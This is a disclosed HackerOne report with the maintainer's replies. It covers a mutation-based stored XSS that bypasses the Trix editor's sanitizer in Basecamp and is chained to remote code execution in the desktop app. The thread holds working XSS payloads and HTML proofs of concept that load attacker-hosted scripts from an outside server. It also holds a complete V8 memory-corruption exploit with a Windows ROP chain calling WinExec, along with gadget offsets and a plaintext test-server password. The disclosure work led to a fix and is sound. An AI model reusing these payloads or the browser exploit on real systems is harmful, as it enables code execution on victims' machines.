---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2025-06-27
submitted: 2024-11-04T14:09:01.019Z
bounty_usd: null
votes: 89
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "sudi"
source: "https://hackerone.com/reports/2819573"
title: "Mutation Based Stored XSS on Trix Editor version latest (2.1.8)"
---
# Mutation Based Stored XSS on Trix Editor version latest (2.1.8)

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 89 | **Program:** Basecamp | **Disclosed:** 2025-06-27

- Report: [https://hackerone.com/reports/2819573](https://hackerone.com/reports/2819573)
- CWE: N/A
- Submitted: 2024-11-04T14:09:01.019Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Heyy there,
I have found a bypass for the sanitizer used in Trix Editor https://github.com/basecamp/trix , the bypass is kind a  of mutation based , using copy paste vector it's possible to perform the xss.

An example payload would be:

```html
copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
```

Decoding the html entity you get the below payload ,which contains the mutation xss vector
```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
```

For more details on this bypass you can read here: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
There will exist will more simple vectors this is just an example which worked out of the blue.

-------------------------------------------------

**Steps to reproduce:**

Using the similar poc from the report #2521419 we can replicate the bug, just save the below code in .html file and then copy the text saying `copy me` and paste it in the editor this will popup an alert.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me`);
  </script>
</body>
</html>

```

{F3733124}

## Impact

An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **Report Collaborator Invited**
- **Report Vulnerability Information Updated**
- **2024-11-04** @sudi: Below you will find the details how the xss payload works:

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
```

When this payload is parsed by the browser for the first time this is how the dom tree is  structured. The `img` element is treated as raw text as it is inside a HTML namespace `style`element so the sanitizer assumes the provided string is safe.

{F3733157}

This is the output which we get from the sanitizer:
{F3733178}

```html
<svg><desc><math><mtext><mglyph><style><img src=x onerror=alert()></style></mglyph><table></table></mtext></math></desc></svg>
```

Some things which should be noted carefully here in this sanitized string is that, earlier the `mglyph` element was a child of the `table` element. But you can see after the parsing the table element no longer is the parent of this element and is now placed after the closing `</mglyph>` tag.

This is a special property of the table element which moves disallowed elements such as mglyph element before.

Now coming to other thing, `mglyph` is a very special element. It's mathml element and a text integeration point  but a special one in case the parent element of `mglyph` is in MathML namespace then the child elements of `mglyph` will also be treated in the MathML NS but if the parent element of `mglyph` is in  HTML NS then the child elements of `mglyph` will also be treated in the HTML NS.

As during the first parsing which is used by the sanitizer to iterate over the dom tree, the `mglyph` element had the `table` element  as it's parent which is in HTML namespace so the child elements of it will be in HTML NS

But when the sanitized string  is parsed one more time magic starts to happen as `table` element moves disallowed elements such as mglyph element before . The `mglyph` parent element is now changed to `mtext` element which is in MathML NS.
So as the parent is in MathML NS , the child of  `mglyph` are also treated as in the MathML NS,  in MathML and SVG NS style element child isn't treated as raw content but as an actual elements itself

{F3733198}

--------------------

# Remediation

Coming to the migitaion for this, if you try to implement your own sanitizer for handling mxss cases it will be a very bad idea. The payload which I have provided in my report is a very basic one there are tons more which are very complicated and would be very challenged to find a way to sanitize those.

Instead of reinventing the wheel of writing/using your own html sanitizer I would recommend moving towards something like Dompurify which is a battle tested library which ensures there is no possible escape from it.
- **Report Collaborator Joined**
- **2024-11-04** @sudi: Similarly the xss also works in the website https://3.basecamp.com and the Desktop application I  will see if I can do anything impactful in the desktop application.
- **External User Joined**
- **Report Severity Updated**
- **Report Triaged**
- **2024-11-12** @sudi: Hey @djmb ,
My friend is working on a RCE  exploit for the desktop application as the electron version is a bit old, it's possible to get RCE via a chrome renderer exploits but as the renderer exploit currently works on Linux only so need some time to adapt it for windows (as Basecamp is not available for Linux the same poc can't be used)

Also can you please remove the added researcher @hiumee (please don't mind bro🥲)  as we will be sharing the poc for the renderer rce here after some time and don't want it to disclose to someone outside.

Regards
Sudhanshu
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **2024-11-16** @s1r1u5: Hello @djmb,

Finally, It took a week to write the working exploit. I attached the proof of concept video below. I will share the PoC once the other collaborator is remove or if it is fine I can share too :)

{F3766815}
- **External User Removed**
- **2024-11-18** @djmb: @sudi, @s1r1u5,

Thanks for the update. I've removed hiumee from the report. If you could share the exploit that would be great.

Thanks
Donal
- **2024-11-18** @s1r1u5: Hi @djmb 

here is the exploit
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;iframe srcdoc='&lt;script src=https://ctf.s1r1us.ninja/basecamp/pwnjsphpacaoasdadad.php&gt;&lt;/script&gt;&lt;button onclick=pwn()&gt;clickme'&gt;Click me&lt;/style&gt;&quot;}"></div>me`);
  </script>
</body>
</html>
```


The exploit we used is a combination of two bugs in v8, for initial memory corruption this in the wild n-day https://issues.chromium.org/issues/341663589 and v8 sandbox escape  this following issue was used https://issues.chromium.org/issues/330404819
pwnjsphpacaoasdadad.php
```js
var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);

function dtoi(d) {
    conv_f64[0] = d;
    return conv_b64[0];
}
function itod(i) {
    conv_b64[0] = i;
    return conv_f64[0];
}

function smi(val) {
    return val << 1n;
}

BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};

function gc_minor() { //scavenge
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7FE00000);
}
function stored(arr, key, val) {
    arr[key] = itod(val);
}

function jit_garanteed(fun) {
    let result = false;

    let counter = 0;

    let recurse = () => {
        counter++;
        recurse();
    }

    let test = (fun) => {
        counter = 0;
        try {
            fun(false);
        } catch (err) {
        }
        return counter;
    }

    let last_depth = 0;
    for (let i = 0; i < 20000; i++) {
        if (i % 410 == 0) {
            let depth = test(recurse);

            if (last_depth != 0 && depth != last_depth) {
                result = true;
                break;
            }
            last_depth = depth;
        } else {
            test(fun);
        }
    }
    return result;
}

function flush_bytecode() {
    const bytecode_old_age = 6;
    for (let i = 0; i < (bytecode_old_age + 1); i++) {
        try {
            gc_major();
        } catch (err) {
        }
    }
}

function store(arr, key, val) {
    arr[key] = val;
}

const IC_INSTALL_COUNT = 9;
for (let i = 0; i < IC_INSTALL_COUNT; i++) {
    store([0], 0, 0);
}
store([1.1], 0, 1.1);

var arr1 = null;
var arr2 = null;
var arr3 = null;
function make_leak() {
    arr1 = new Array(1.1, 1.2);
    let a = 123;

    (arg = class foo {
        static {
            this;
        }
    }) => { }
    {
        function inner(b) {
            if (b) {
                return a;
            }
        };
    }
    return inner;
}
class MyArray extends Array { }
new MyArray();
function make_oob_write() {
    arr2 = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15);
    arr3 = new MyArray(1.1, 1.1, 1.1, 1.1);
    arr_addrof = [{}];
    aar_double = [2.17, 2.17];
	aar_double1 = [2.17, 2.17];
    aar_double2 = [2.17, 2.17];
    aar_double3 = [2.17, 2.17];
    aar_double4 = [2.17, 2.17];
    aar_double5 = [2.17, 2.17];
    let a = 123;

    (arg = class foo {
        static {
            this;
        }
    }) => { }
    {
        function inner(b, x) {
            if (b) {
                a = x;
            }
        };
    }
    return [inner, arr_addrof, aar_double];
}

function install_primitives() {
    let leak = make_leak();
    leak(false);
    let [oob_write, arr_addrof, aar_double] = make_oob_write();
    oob_write(false, 0);

    flush_bytecode();

    leak = make_leak();
    [oob_write, arr_addrof, aar_double] = make_oob_write();
    jit_garanteed(leak);
    jit_garanteed(oob_write);

    let dbl_arr_map = leak(true);
    // console.log(arr2);


    oob_write(true, dbl_arr_map);

    let new_arr3_length = 0x40n;
    store(arr2, 14, itod(smi(new_arr3_length) | 0n << 32n));


    return [arr2, arr3, arr_addrof, aar_double];
}
function pwn(){

    var [arr2, arr3, arr_addrof, aar_double] = install_primitives();
    console.log("[+] arr2.length " + arr2.length);
    console.log("[+] arr3.length " + arr3.length);


    function addrof(obj) {
        arr_addrof[0] = obj;
        return (dtoi(arr3[5]) & 0xffffffffn) - 1n;
    }

     read_count=0
    write_count=0

    function heap_read(addr) {
        read_count+=1;
        var prev_val = arr3[15]

        val = (dtoi(arr3[15]) & 0xffffffff00000000n) | ((addr - 0x8n) | 1n);
        arr3[15] = itod(val)
        result = dtoi(aar_double[0]);
		 console.log(`[+] read_${read_count}: from ${addr.hex()} the value ${result.hex()}`);

        arr3[15] = prev_val;
        return result
    }
	a=1;
    function heap_write(addr, value) {
        write_count+=1;
        var prev_val = arr3[15];
        val = (dtoi(arr3[15]) & 0xffffffff00000000n) | ((addr - 0x8n) | 1n);
        console.log(`[+] write_${write_count} to: ` + val.hex(), value.toString(16));

        arr3[15] = itod(val);
        aar_double[0] = itod(value);
        arr3[15] = prev_val;
    }


    function heap_write1(addr, value) {
        var prev_val = aar_double[8];
        val = (dtoi(aar_double[8]) & 0xffffffff00000000n) | ((addr - 0x8n) | 1n);
        console.log("[+] writing1 to: " + val.hex(), value.toString(16));
        aar_double[8] = itod(val);

        aar_double1[0] = itod(value);
        aar_double[8] = prev_val;
    }
    function heap_read1(addr) {
        var prev_val = aar_double[8]
        val = (dtoi(aar_double[8]) & 0xffffffff00000000n) | ((addr - 0x8n) | 1n);
        aar_double[8] = itod(val)
        // stored(arr3,15 , val)
        result = dtoi(aar_double1[0]);
        // store(arr3, 15, prev_val)
        aar_double[8] = prev_val;
        return result
    }

    var readHeap4 = (offset) => {
        value = heap_read(offset);
        return (value & 0x00000000ffffffffn);
    }
    var writeHeap4 = (offset, value) => {
        old_value = heap_read(offset);
        let new_value = (old_value & 0xffffffff00000000n) | (BigInt(value) & 0xffffffffn);
        heap_write(offset, new_value);
    }
    var readHeap41 = (offset) => {
        value = heap_read1(offset);
        return (value & 0x00000000ffffffffn);
    }
    var writeHeap41 = (offset, value) => {
        old_value = heap_read1(offset);
        let new_value = (old_value & 0xffffffff00000000n) | (BigInt(value) & 0xffffffffn);
        heap_write1(offset, new_value);
    }


	for(i=0;i<arr3.length;i++){
		console.log(i, dtoi(arr3[i]).hex())
	}


    //  let s = `/tmp/test.sh # Applications/Calculator.app/Contents/MacOS/Calculator`;
    // let s= `//////System/Applications/Calculator.app/Contents/MacOS/Calculator`;
    let s = "aaaaa";

    //  %DebugPrint(s);
     regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;

    //  regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]/g;
    // %DebugPrint(regex);
     let addr_regex = addrof(regex);
    let data_addr = readHeap4(addr_regex + 0xcn);
    regex.exec(s);// old=0x1bn new=0x3b
    let bytecode = readHeap4(data_addr + 0x1bn); // +0x20 where actual bytecodestarts
    console.log("[+] data_addr @: " + data_addr.hex());
    console.log("[+] bytecode @: " + bytecode.hex());
    // write for tier-up
    writeHeap4(data_addr + 0x2fn, 2n);



    let arr_bytecode = [];
    function push_reg(idx) {
        arr_bytecode.push((idx << 8) & 0xffffff00 | 0x03);
    }

    function pop_reg(idx) {
        arr_bytecode.push((idx << 8) & 0xffffff00 | 0x0c);
    }

    function mov_reg1_to_reg2(idx1, idx2) {
        push_reg(idx1);
        pop_reg(idx2);
    }


    function advance_reg(idx, value) {
        arr_bytecode.push((idx << 8) & 0xffffff00 | 0x09);
        arr_bytecode.push(value);
    }

    function set_reg(idx, value) {
        arr_bytecode.push((idx << 8) & 0xffffff00 | 0x08);
        arr_bytecode.push(value);
    }

    function success() {
        arr_bytecode.push(0x0000000e);
    }

    let idx = 0x5e;
    // let idx=10


    function add_gadget(addr) {
        mov_reg1_to_reg2(3, 5);
        advance_reg(5, addr);
        mov_reg1_to_reg2(5, idx++);
        mov_reg1_to_reg2(4, idx++);
    }
    function add_sp(addr) {
        mov_reg1_to_reg2(6, 8);
        advance_reg(8, addr);
        mov_reg1_to_reg2(8, idx++);
        mov_reg1_to_reg2(7, idx++);
    }
    function add_sp_lower(addr) {
        mov_reg1_to_reg2(6, 8);
        advance_reg(8, addr);
        mov_reg1_to_reg2(8, idx++);
        set_reg(idx++, 0)
        // mov_reg1_to_reg2(7, idx++);
    }

    idx = 0x86;
    // set_reg(idx++,0x41414141);
    //  set_reg(idx++,0x41414141);

    // success();
    // set_reg(6, 0xdeadbeef)
    // set_reg(7, 0xdeadbeef)
    mov_reg1_to_reg2(0x87, 4); // at 0x5e,0x5f idx there is ret addres which is also $rbp+8
    mov_reg1_to_reg2(0x86, 3);


     advance_reg(3, 0xff33fcab)//<-base to binary

     /*
     d.writemem C:\Users\hacker\Documents\text_section.bin 00007ff7`51e60000 00007ff7`51e60100
     dump and run ropper to find gadgets
    Gadgets <- ropgadget offset is from entry point, entry points may differ
    0x1980239 : pop rax ; ret
    0x5175284 : mov qword ptr [rax], rcx ; ret
    0x1091222 :  pop rdx ; ret
    0x45f25a0 :     pop     rcx ;          ret
    x kernel32!WinExec
    base+0x642388820
     */
    add_gadget(0x45f25a0) // pop rcx; ret
    set_reg(idx++, 0x636c6163 )  // <- store calc.exe addr from stack
    set_reg(idx++, 0x6578652e )
    add_gadget(0x1980239) // pop rax; ret
    add_gadget(0x9510000+0x9000) // writable address/found via !dh module ; .data section
    add_gadget(0x5175284) // mov qword ptr[rax], rcx; ret; store calc.exe here

    add_gadget(0x45f25a0) // pop rcx; ret <- get calc.exe address to rcx
    add_gadget(0x9510000+0x9000)

    add_gadget(0x1091222) //  pop rdx ; ret ;
    set_reg(idx++, 0x1);    // rdx = SW_SHOWNORMAL
    set_reg(idx++, 0x0);

    advance_reg(4,6) //updating lower 32 and upper 32. because kernel 32 is otuside our base

    add_gadget(0x642388820) // kernel32!WinExe
    success();

    // console.log(arr_bytecode.length) ;


    // write ic of write and read to increase it

    console.log("[+] aar_double.len "+ aar_double.length)
    val = (dtoi(arr3[15]) & 0x00000000ffffffffn) | (0x30n<<32n)
    arr3[15] = itod(val);
    console.log("[+] aar_double.len "+aar_double.length);

    write_addrof = addrof(heap_write);
    read_addrof = addrof(heap_read);
    console.log("write_addrof: " +write_addrof.hex());
    console.log("read_addrof: "+ read_addrof.hex());

    write_feedback_arr = readHeap4(write_addrof+0x14n);
    read_feedback_arr = readHeap4(read_addrof +0x14n);
   console.log("[+] write_feedback_arr: "+write_feedback_arr.hex());
   console.log("[+] read_feedback_arr: "+read_feedback_arr.hex());

    writeHeap4(read_feedback_arr+0x8n, 0x12345n);
    writeHeap4(write_feedback_arr+0x8n, 0x12345n);
   console.log("[+] write_feedback_arrv1: "+write_feedback_arr.hex());
   console.log("[+] read_feedback_arrv1: "+read_feedback_arr.hex());


    for (var i = 0n; i < arr_bytecode.length; i++) {
        writeHeap4(bytecode + 0x7n + 4n * i, arr_bytecode[i]);
    }

     regex.exec(s);

}

//pwn()
```

A successful exploit will output the following in console and pops calculator

https://gist.github.com/Sudistark/e093c60fddcb496bef35993546297dc6
- **2024-11-18** @djmb: Hi @s1r1u5,

Could you provide a step by step explanation of how the exploit works please?

Thanks
Donal
- **2024-11-18** @djmb: @s1r1u5, I've been unable to reproduce your exploit.

I click on the "clickme" button and the basecamp window goes grey like in your video, but the calculator does not launch.

I've tested using version 2.3.17 of the Basecamp app and running on Windows Server 2022.

Do you have any more details of how to reproduce?

Regards
Donal
- **2024-11-18** @s1r1u5: "I clicked on the 'ClickMe' button, and the Basecamp window turned grey like in your video, but the calculator didn’t launch."

Ah, I see what’s happening here. We encountered the same issue on @sudi's computer yesterday. The problem lies with the ROP chain I used—the kernel32!WinExec offset seems to vary between systems. This isn’t a major issue, but addressing it requires extra effort. Specifically, I’d need to either:

1. Spend more time to write an exploit that can brute-force the address continuously (e.g., in iframes) until the calculator pops, or find a reliable way to leak the base of kernel32.

2. Alternatively, we could hop on a call to quickly resolve this together. An attacker wouldn’t face the same challenge, as determining the base address isn’t particularly difficult—I just want to avoid spending additional time on this if possible.

Let me know how you’d like to proceed, and I’ll do accordingly. we fixed in sudi's computer in few mins just by figuring out offset to kernelexec with windbg.
- **2024-11-18** @s1r1u5: Hi @djmb ,

It turned out to be easier, I updated PoC with a different ROP chain that leaks Kernel base first and then jumps to WinExec


```

; ROP Stage 1: Write "calc.exe" to a writable memory section
pop rcx              ; Load "calc.exe" part into rcx
ret;
pop rax              ; Load writable address into rax >0x9519000
ret;
mov [rax], rcx       ; Write "calc" to writable section


; ROP Stage 2: Resolve kernel base and WinExec function address
pop rcx              ; Load kernel base into rcx
ret   ;
mov rax, [rcx]       ; Resolve kernel function pointer
pop rbx              ; Load offset to WinExec
ret     ; Offset of WinExec from kernel base ->0x68820
add rax, rbx         ; Calculate WinExec address

; ROP Stage 3: Prepare parameters for WinExec
pop rcx              ; Load address of "calc.exe" into rcx; 0x9519000
ret;
pop rdx              ; Load SW_SHOWNORMAL into rdx
ret       ;     0x1 SW_SHOWNORMAL = 1
add rsp, 0x20        ; Align stack 
add rax, rbx         ; 

; ROP Stage 4: Trigger WinExec
call rax             ; Call WinExec("calc.exe", SW_SHOWNORMAL)

```
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;iframe srcdoc='&lt;script src=https://ctf.s1r1us.ninja/basecamp/pwnjsphpacaoasdadad.php&gt;&lt;/script&gt;&lt;button onclick=pwn()&gt;clickme'&gt;Click me&lt;/style&gt;&quot;}"></div>me`);
  </script>
</body>
</html>
```
- **2024-11-19** @sudi: Ok sorry @djmb, the poc mentioned in the previous reply was still failing  on my pc . So  @s1r1u5 worked to create new poc which is very stable now. I am sharing all the details below

Please ensure that you are using the same system as mine:

{F3771017}

```
Edition	Windows 11 Home Single Language
Version	23H2
Installed on	‎29-‎12-‎2022
OS build	22631.4460
Experience	Windows Feature Experience Pack 1000.22700.1047.0
```


Use the below poc to copy the rce payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;iframe srcdoc='&lt;script src=https://ctf.s1r1us.ninja/basecamp/sudiworking.php&gt;&lt;/script&gt;&lt;button onclick=pwn()&gt;clickme'&gt;Click me&lt;/style&gt;&quot;}"></div>me`);
  </script>
</body>
</html>
```

Paste the copied payload  in rich editor interfaces such as the Message Board

Here's the video poc step by step of each process:

{F3772577}




If the above poc still fails then we might need to create  new poc for your system which will have the correct offsets,so in that case would you mind sharing your PC specs OS Builds/System we will spun up a os in aws and find the offset correct then share you the updated poc.
- **2024-11-19** @djmb: Thanks @sudi,

I'm still not able to reproduce the RCE on Windows Server 2022, but I have asked a colleague who should have Windows 11 to check for me. I'll let you know how they get on.

Cheers
Donal
- **2024-11-20** @djmb: Hi @sudi,

We've not been able to reproduce this - we've tried on two Windows 11 VMs and on Windows 10.

I have a fix for the mutation based XSS which I'm going to roll out tomorrow, if we can't reproduce it by then we'll have to move on.

I'm testing it on a Windows VM running in VirtualBox on an 2020 Intel MacBook Air.

I downloaded the VM from https://www.microsoft.com/en-us/software-download/windows11.

It's version 24H2 rather than 23H2 which you were running.

```
Edition       Windows 11 Home
Version       24H2
Installed on  11/20/2024
OS build      26100.1742
Experience     Windows Feature Experience Pack 1000.26100.18.0
 ```

Thanks
Donal
- **2024-11-20** @sudi: Hey @djmb ,
So finally we have a reliable way to confirm the RCE, this would work all the time.  To make sure we are using the same environment we spin up a Windows Server 2022 on AWS using this linkhttps://aws.amazon.com/marketplace/pp/prodview-dq4sxno5vuy7m

Every option is set to default while setting up the instance you can match the specs via the screenshots below also:
{F3777169}
{F3777239}


**Steup Details**
You can either spin up your own new Microsoft Windows Server 2022 from AWS using this link https://aws.amazon.com/marketplace/pp/prodview-dq4sxno5vuy7m or use the one which I am providing where we confirmed the exploit already, just  download the .rdp file and use this password  `mJPF;)dsh8-X5BLzuTxYrQr-R=OpfOU?`.
Basecamp is already installed there and the exploit .html is named as test.html which should be visible in the Desktop itself

{F3777198}
-----------------------------------------


We also confirmed the same exploit by killing the old instance and creating a totally new one and the exploit did worked successfully. 

In the v8 exploit , the offset was changed here only `-423328`, which we found that remains same across all the AWS hosted  Microsoft Windows Server 2022 which is a good thing for us
```
  add_gadget(0x30bb9c0) // mov     rax,qword ptr [rcx]; ret;
   add_gadget(0x4536e4d+2) //  pop rbx; ret;
   set_reg(idx++, 0x68820-423328)
   set_reg(idx++,0 )
```

-------------------------------------

Here's the updated poc link which you can use to copy the payload, just paste it in any rich text editor interface such as the Message Board option in Basecamp and then click on the button which says `Click me` :

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;iframe srcdoc='&lt;script src=https://ctf.s1r1us.ninja/basecamp/sudiworkingwin2002.js&gt;&lt;/script&gt;&lt;button onclick=pwn()&gt;clickme'&gt;Click me&lt;/style&gt;&quot;}"></div>me`);
  </script>
</body>
</html>
```

A calculator will popup indicating the successfull exploit of this issue, the written exploit by s1r1u5 is very stable if for any reason it fails just try closing basecamp (killing the process from Task Manager) then restarting the app again and click on the button the Calculator should popup.


----------------------------------------------------------

**Video poc** 
For the exploit in action on fully new instance:
{F3777221}

Thankyou
- **2024-11-20** @s1r1u5: The above will work on Windows, anyhow I also wrote the PoC for macos arm with the following config. 
{F3777473}
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;iframe srcdoc='&lt;script src=https://ctf.s1r1us.ninja/basecamp/macossiliconworking.js&gt;&lt;/script&gt;&lt;button onclick=pwn()&gt;clickme'&gt;Click me&lt;/style&gt;&quot;}"></div>me`);
  </script>
</body>
</html>{F3777486}
```

I attached the poc, the poc will only work with same config macos :|
- **2024-11-20** @s1r1u5: Hi @djmb 


I believe the previous PoC on macOS, even if it doesn’t work for you, is no longer relevant for this context. To be honest, we’re not state-sponsored attackers or a large offensive security team with resources to create highly reliable exploits—and it’s fair to say this is a skill issue from my end 😅. That said, I’m confident I could craft a more reliable exploit given enough time, but I’ve already spent over 100 hours on this, and it no longer feels reasonable to invest more time just to perfect it.

As @sudi suggested, spinning up an AWS Windows server with same configurations he mentioned should be sufficient to validate the PoC and demonstrate the potential impact effectively. This approach would also confirm the legitimacy of the findings and confirms that we are not faking it. Additionally, I previously reported a similar memory corruption issue to Basecamp, which you can review here: HackerOne Report #1349505.

I hope you understand.
- **Report Severity Updated**
- **Report Triaged**
- **2024-11-21** @djmb: Hi @sudi,

I've deployed a fix for this to Basecamp. Could you confirm is it is resolved now?

Thanks
Donal
- **2024-11-22** @sudi: Hey @djmb ,
Can confirm the xss is no more reproducible, you are now using Dompurify. `tl` object is an instance of dompurify, 

```js
                sanitize() {
                    return this.sanitizeElements(),
                    this.body = Nr(tl.sanitize(this.body, {
                        ADD_ATTR: ["language"]
                    })),
                    this.normalizeListElementNesting()
                }
```

Something which caught our interest was the `Nr` method which was used to convert the returned sanitized string from dompurify to a dom tree, making any changes to a sanitized output can lead to unexpected results so it should be avoided at all costs

```js
            let Nr = function() {
                let i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
                i = i.replace(/<\/html[^>]*>[^]*$/i, "</html>");
                let t = document.implementation.createHTMLDocument("");
                return t.documentElement.innerHTML = i,
                Array.from(t.head.querySelectorAll("style")).forEach(e => {
                    t.body.appendChild(e)
                }
                ),
                t.body
            }
```

It uses a regex to remove anything after the closing `</html>` string. Just an example if there a string such as. It can turn safe sanitized string to something dangerous

```js
`<a id="<img src=x onerror=alert()></html>">`.replace(/<\/html[^>]*>[^]*$/i, "</html>");
<a id="<img src=x onerror=alert()></html>
```

We tried crafting  a payload to achieve the same result, but couldn't managed to do it.

Suggestion, If you want to get the dom tree you can use the following option option which dompurify provides and try to avoid making any changes to the sanitized string in any way

```
// return a DOM HTMLBodyElement instead of an HTML string (default is false)
const clean = DOMPurify.sanitize(dirty, {RETURN_DOM: true});
```
- **2024-11-26** @djmb: Hi @sudi,

Thanks for that suggestion - I've updated the fix to return the DOM as you've suggested. I've also moved the normalizeListElementNesting step to happen before calling DomPurify.

Cheers
Donal
- **Bounty Awarded**
- **Bounty Awarded**
- **Bounty Awarded**
- **2024-11-26** @s1r1u5: Hi @djmb ,

thanks for the bounty :). Also for the v8 bug, it would be ideal to constantly updating Electron version from time to time, so that getting RCE will be harder or even enabling sandbox will fix the issues with v8 once and for all. I haven't noticed anything that requires disabling sandbox in basecamp, so I think it would be easy to enable sandbox without breaking anything
- **2024-11-26** @djmb: Hi @s1r1u5,

Thanks for the suggestions - we have an update to the app in progress so we should be running with Electron v33 soon.

Regards
Donal
- **Report Resolved**
- **2024-12-09** @sudi: Hey @djmb ,
The timing for this https://x.com/cure53berlin/status/1866057011466568015 is very unfortunate,  a bypass was just dropped for exactly the same config `RETURN_DOM` few hours ago.

And the Dompurify version used in fixed version of Trix Editor is 3.2.0 , can you bump the version otherwise I think it would be possible to use the new vector to get xss?

It very rarely happens that there is a bypass for dompurify but they do sometimes, so just to be on the safe side please update the dompurify version to the latest and ensure that you are keeping up with the updates in future also.
- **2024-12-09** @djmb: Huh, that's some timing, thanks for pointing that out!

I'll releasing 2.1.10 and 1.3.4 now.

Cheers
Donal
- **2025-01-11** @s1r1u5: .
- **2025-01-11** @sudi: Kindly ignore the previous disclosure request ,we will do it later not now.
- **Agreed On Going Public**
- **Report Became Public**
